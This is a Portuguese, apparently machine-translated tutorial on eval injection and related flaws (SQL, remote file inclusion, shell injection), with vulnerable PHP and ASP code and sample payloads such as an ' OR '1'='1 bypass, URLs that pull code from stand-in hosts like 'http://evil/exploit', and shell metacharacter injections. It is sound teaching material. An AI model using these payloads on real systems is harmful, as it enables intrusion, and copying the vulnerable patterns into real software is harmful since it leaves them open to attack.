Avaliação dinâmica de código direto ('Injeção Eval')

Descrição

Este ataque consiste em um roteiro que não valida corretamente as entradas de usuário no parâmetro da página. Um usuário remoto pode fornecer uma URL especialmente criada para passar um código arbitrário que seja de uma instrução eval (), o que resulta na execução de código.
Nota 1: Este ataque vai executar o código com a mesma permissão como o serviço web de destino, incluindo os comandos do sistema de operação.
Nota 2: injeção Eval é prevalente em manipulador / procedimentos que podem querer invocar um grande número de funções de envio, ou definir um grande número de variáveis​​.

Exemplos

Exemplo 1 ~
Neste exemplo, um atacante pode controlar todo ou parte de uma cadeia de entrada que é alimentado em uma eval () chamada de função:


$myvar = "varname"; 
  $x = $_GET['arg']; 
  eval("\$myvar = \$x;"); 


O argumento do "eval" será processado como PHP, então comandos adicionais podem ser acrescentados. Por exemplo, se "arg" é definido como "10; system (\" / bin / echo uh-oh \ ");", código adicional é de gerência que executa um programa no servidor, neste caso "/ bin / echo ".

Exemplo 2 ~
O seguinte é um exemplo de SQL Injection. Considere-se uma página web que tem dois campos para permitir que os usuários digitem um nome de usuário e uma senha. O código por trás da página irá gerar uma consulta SQL para verificar a senha com a lista de nomes de usuário:


SELECT UserList.Username
FROM UserList
WHERE
UserList.Username = 'Username'
AND UserList.Password = 'Password'


Se essa consulta retorna exatamente uma linha, então o acesso é concedido. No entanto, se um usuário mal-intencionado entra com um nome de usuário válido e injeta um código válido ("'OR 1 = 1") no campo Senha, em seguida, a consulta resultante será parecido com esta:



SELECT UserList.Username
FROM UserList
WHERE
UserList.Username = 'Username'
AND UserList.Password = 'Password' OR '1'='1'


No exemplo acima, "palavra-passe" é assumido ser branco ou alguma cadeia inócua. "1 = 1" será sempre verdadeiro e muitas linhas será devolvidas, permitindo assim o acesso. A vírgula invertida final será ignorado pelo parser SQL. A técnica pode ser refinado para permitir que várias instruções para ser executado, ou mesmo para carregar e executar programas externos.

Exemplo 3 ~
Este é um exemplo de um arquivo que foi injetado. Considere este programa PHP (que inclui um arquivo especificado pelo pedido):



<?php
   $color = 'blue';
   if ( isset( $_GET['COLOR'] ) )
      $color = $_GET['COLOR'];
   require( $color . '.php' );
?>
<form>
   <select name="COLOR">
      <option value="red">red</option>
      <option value="blue">blue</option>
   </select>
   <input type="submit">
</form>



O desenvolvedor pensou que isso iria garantir que apenas blue.php e red.php pôde ser carregado. Mas, como qualquer pessoa pode facilmente inserir valores arbitrários na cor, é possível injetar um código de arquivos:

- /vulnerable.php?COLOR = http://evil/exploit - injeta um arquivo hospedado remotamente contendo um exploit.
- /vulnerable.php?COLOR = C:\ftp\de upload\explorar - injeta um arquivo enviado contém um exploit.
- /vulnerable.php?COLOR = .. \..\..\..\ftp\de upload\explorar - injeta um arquivo enviado contém um exploit, usando Path Traversal.
- / vulnerable.php?COLOR = C:\ notes.txt% 00 - exemplo de uso de caracteres Null, caráter Meta para remover o sufixo php, permitindo o acesso a outros arquivos de php... (PHP configuração "magic_quotes_gpc = On", que é padrão, iria parar este ataque)

Exemplo 4 ~
A URL simples que demonstra uma maneira de fazer esse ataque:


http://some-page/any-dir/index.php?page=<?include($s);?>&s=http://malicious-page/cmd.txt?  


Exemplo 5 ~
A injeção da Shell aplica-se à maioria dos sistemas de software que permitem a execução de programação de uma linha de comando. As fontes típicas de Shell Injection são chamadas de sistema (), StartProcess (), java.lang.Runtime.exec () e APIs similar.
Considere o seguinte programa PHP curto, que executa um programa externo chamado funnytext para substituir uma palavra que o usuário enviado com alguma outra palavra.


<HTML>
<?php
passthru ( " /home/user/phpguru/funnytext " 
           . $_GET['USER_INPUT'] );
?>


Este programa pode ser injetado de várias maneiras:
`command` vai executar o comando.
$ (commnd) irá executar o comando.
, command irá executar o comando, eo resultado de comando de saída.
| command irá executar o comando, eo resultado de comando de saída.
&& command vai executar o comando, eo resultado de comando de saída.
|| command irá executar o comando, eo resultado de comando de saída.
> / Home / user / phpguru / .bashrc irá substituir o arquivo. Bashrc.
</ Home / user / phpguru / .bashrc irá enviar arquivo. Bashrc como entrada para funnytext.
PHP oferece escapeshellarg () e escapeshellcmd () para executar a codificação antes de chamar os métodos. No entanto, não é recomendável confiar nesses métodos para ser seguro - também validar / higienizar entrada.

Exemplo 6 ~
O código a seguir é vulnerável a injeção de eval (), porque não limpar a entrada do usuário (neste caso: "username"). O programa só salva esta entrada em um arquivo txt, e, em seguida, o servidor irá executar esse arquivo, sem qualquer validação. Neste caso, o utilizador é capaz de introduzir um comando, em vez de um nome de utilizador.
Exemplo:


<%
	If not isEmpty(Request( "username" ) ) Then
		Const ForReading = 1, ForWriting = 2, ForAppending = 8
		Dim fso, f
		Set fso = CreateObject("Scripting.FileSystemObject")
		Set f = fso.OpenTextFile(Server.MapPath( "userlog.txt" ), ForAppending, True)
		f.Write Request("username") & vbCrLf
		f.close
		Set f = nothing
		Set fso = Nothing
		%>
		<h1>List of logged users:</h1>
		<pre>
		<%
			Server.Execute( "userlog.txt" )
		%>
		</pre>
		<%
	Else
		%>
		<form>
			<input name="username" /><input type="submit" name="submit" />
		</form>
		<%
	End If
%>


Um pouco similar à Code Injection (Injeção de Código).